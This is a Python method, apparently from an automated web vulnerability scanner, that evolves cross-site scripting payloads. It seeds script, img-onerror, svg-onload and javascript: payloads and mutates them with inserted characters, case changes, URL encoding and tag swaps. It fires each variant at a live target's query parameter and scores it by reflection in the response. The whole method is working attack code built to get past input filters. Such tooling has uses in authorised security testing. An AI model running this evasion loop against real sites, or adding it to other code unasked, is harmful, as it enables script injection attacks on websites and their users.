    def test_omega_genetic_payload_evolution(self):
        """Wave5 Omega #1 — Genetic Payload Evolution.

        Evolve exploit payloads through generations based on
        response feedback.
        """
        if not self.deep: return
        self._print("[*]", "Wave5: Omega Genetic Evolution...", "INFO")
        import random
        population = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
        ]
        # Mutation operators
        def mutate(p):
            op = random.choice(["insert", "case", "encode", "tag_swap"])
            if op == "insert" and len(p) < 100:
                pos = random.randint(0, len(p))
                c = random.choice(["/", " ", "\t", "<", ">", "%", "\\"])
                return p[:pos] + c + p[pos:]
            elif op == "case":
                return "".join(c.upper() if random.random() < 0.3 else c for c in p)
            elif op == "encode":
                import urllib.parse
                return urllib.parse.quote(p)
            else:  # tag_swap
                swaps = [("<script", "<svg"), ("</script>", "/>"),
                          ("alert", "confirm")]
                for o, n in swaps:
                    if random.random() < 0.5:
                        p = p.replace(o, n, 1)
                return p
        # Fitness: payload reflected + alert present
        for generation in range(5):
            scored = []
            for p in population:
                r = self._get(self.target, params={"q": p})
                fitness = 0
                if r:
                    txt = r.text or ""
                    if "alert(1)" in txt or "alert(2)" in txt: fitness += 10
                    if "alert" in txt and "onerror" in txt: fitness += 5
                    if p in txt: fitness += 3
                scored.append((p, fitness))
            scored.sort(key=lambda x: -x[1])
            if scored[0][1] >= 8:
                self._add_vuln(f"Wave5 Genetic Payload (gen {generation})",
                                "HIGH", self.target,
                                f"Evolved payload fitness={scored[0][1]}: "
                                f"{scored[0][0][:60]}",
                                generation=generation, payload=scored[0][0][:60])
                break
            population = [s[0] for s in scored[:2]]
            while len(population) < 4:
                parent = random.choice(scored[:2])[0]
                population.append(mutate(parent))

